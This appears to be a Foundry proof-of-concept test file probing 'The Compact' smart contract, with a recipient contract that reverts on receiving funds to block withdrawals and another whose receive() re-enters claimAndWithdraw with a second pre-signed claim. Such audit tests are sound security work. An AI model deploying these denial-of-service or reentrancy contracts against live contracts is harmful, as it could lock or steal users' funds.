import { ITheCompactClaims } from "src/interfaces/ITheCompactClaims.sol";
import "test/TheCompact.t.sol";

contract BadRecipient {
    ITheCompactClaims internal immutable COMPACT;

    uint256 value;

    constructor(ITheCompactClaims compact) {
        COMPACT = compact;
    }

    receive() external payable {
        value = msg.value;
        revert("dos");
    }
}

contract ReentrancyRecipient {
    ITheCompactClaims internal immutable COMPACT;

    uint256 value;
    BasicClaim claim;

    constructor(ITheCompactClaims compact) {
        COMPACT = compact;
    }

    function setClaim(BasicClaim calldata _claim) external {
        claim = _claim;
    }

    receive() external payable {
        COMPACT.claimAndWithdraw(claim);
    }
}

contract PocTest is TheCompactTest {
    BadRecipient badRecipient;
    ReentrancyRecipient reentrancyRecipient;

    uint256 otherAllocatorPk = 31337;
    address otherAllocator;

    function setUp() public override {
        super.setUp();

        badRecipient = new BadRecipient(theCompact);
        reentrancyRecipient = new ReentrancyRecipient(theCompact);
        otherAllocator = vm.addr(otherAllocatorPk);
    }

    function test_revertingRecipient() public {
        ResetPeriod resetPeriod = ResetPeriod.TenMinutes;
        Scope scope = Scope.Multichain;
        uint256 amount = 1e18;
        uint256 nonce = 0;
        uint256 expires = block.timestamp + 1000;
        address claimant = address(badRecipient);
        address arbiter = 0x2222222222222222222222222222222222222222;

        vm.prank(allocator);
        theCompact.__registerAllocator(allocator, "");

        vm.prank(swapper);
        uint256 id = theCompact.deposit{ value: amount }(allocator, resetPeriod, scope, swapper);
        assertEq(theCompact.balanceOf(swapper, id), amount);

        bytes32 claimHash = keccak256(abi.encode(keccak256("Compact(address arbiter,address sponsor,uint256 nonce,uint256 expires,uint256 id,uint256 amount)"), arbiter, swapper, nonce, expires, id, amount));

        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), theCompact.DOMAIN_SEPARATOR(), claimHash));

        (bytes32 r, bytes32 vs) = vm.signCompact(swapperPrivateKey, digest);
        bytes memory sponsorSignature = abi.encodePacked(r, vs);

        (r, vs) = vm.signCompact(allocatorPrivateKey, digest);
        bytes memory allocatorSignature = abi.encodePacked(r, vs);

        BasicClaim memory claim = BasicClaim(allocatorSignature, sponsorSignature, swapper, nonce, expires, id, amount, claimant, amount);

        vm.prank(arbiter);
        (bool status) = theCompact.claimAndWithdraw(claim);
        vm.snapshotGasLastCall("claimAndWithdraw");
        assert(status);

        assertEq(address(theCompact).balance, 0);
        assertEq(claimant.balance, amount);
        assertEq(theCompact.balanceOf(swapper, id), 0);
        assertEq(theCompact.balanceOf(claimant, id), 0);
    }

    function test_reentrancyRecipient() public {
        ResetPeriod resetPeriod = ResetPeriod.TenMinutes;
        Scope scope = Scope.Multichain;
        uint256 amount = 1e18;
        uint256 nonce = 0;
        uint256 expires = block.timestamp + 1000;
        address claimant = address(reentrancyRecipient);
        address arbiter = 0x2222222222222222222222222222222222222222;

        vm.prank(allocator);
        theCompact.__registerAllocator(allocator, "");

        vm.prank(otherAllocator);
        theCompact.__registerAllocator(otherAllocator, "");

        vm.prank(swapper);
        uint256 id = theCompact.deposit{ value: amount }(allocator, resetPeriod, scope, swapper);
        uint256 idReentrancy = theCompact.deposit{ value: amount }(otherAllocator, resetPeriod, scope, swapper);

        bytes32 claimHash = keccak256(abi.encode(keccak256("Compact(address arbiter,address sponsor,uint256 nonce,uint256 expires,uint256 id,uint256 amount)"), arbiter, swapper, nonce, expires, id, amount));
        bytes32 claimHashReentrancy =
            keccak256(abi.encode(keccak256("Compact(address arbiter,address sponsor,uint256 nonce,uint256 expires,uint256 id,uint256 amount)"), claimant, swapper, 1, expires, idReentrancy, amount));

        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), theCompact.DOMAIN_SEPARATOR(), claimHash));
        bytes32 digestReentrancy = keccak256(abi.encodePacked(bytes2(0x1901), theCompact.DOMAIN_SEPARATOR(), claimHashReentrancy));

        (bytes32 r, bytes32 vs) = vm.signCompact(swapperPrivateKey, digest);
        bytes memory sponsorSignature = abi.encodePacked(r, vs);

        (r, vs) = vm.signCompact(allocatorPrivateKey, digest);
        bytes memory allocatorSignature = abi.encodePacked(r, vs);

        // interesting to see what happens in a sp0it case... will
        SplitComponent memory splitOne = SplitComponent({ claimant: claimant, amount: amount / 2 });
        SplitComponent memory splitTwo = SplitComponent({ claimant: makeAddr("claimantTwo"), amount: amount / 2 });

        SplitComponent[] memory recipients = new SplitComponent[](2);
        recipients[0] = splitOne;
        recipients[1] = splitTwo;

        SplitClaim memory claim = SplitClaim(allocatorSignature, sponsorSignature, swapper, nonce, expires, id, amount, recipients);

        (r, vs) = vm.signCompact(swapperPrivateKey, digestReentrancy);
        sponsorSignature = abi.encodePacked(r, vs);

        (r, vs) = vm.signCompact(otherAllocatorPk, digestReentrancy);
        allocatorSignature = abi.encodePacked(r, vs);

        BasicClaim memory claimReentrancy = BasicClaim(allocatorSignature, sponsorSignature, swapper, 1, expires, idReentrancy, amount, makeAddr("foo"), amount);
        reentrancyRecipient.setClaim(claimReentrancy);

        vm.prank(arbiter);
        (bool status) = theCompact.claimAndWithdraw(claim);
        vm.snapshotGasLastCall("claimAndWithdraw");
        assert(status);

        assertEq(address(theCompact).balance, 1e18 + amount / 2, "compact balance");
        assertEq(claimant.balance, 0, "reentranct claimaint balance should be 0");
        assertEq(makeAddr("claimantTwo").balance, amount / 2, "claimaint balance");
        assertEq(theCompact.balanceOf(swapper, id), 0);
        assertEq(theCompact.balanceOf(claimant, id), 0);
    }
}
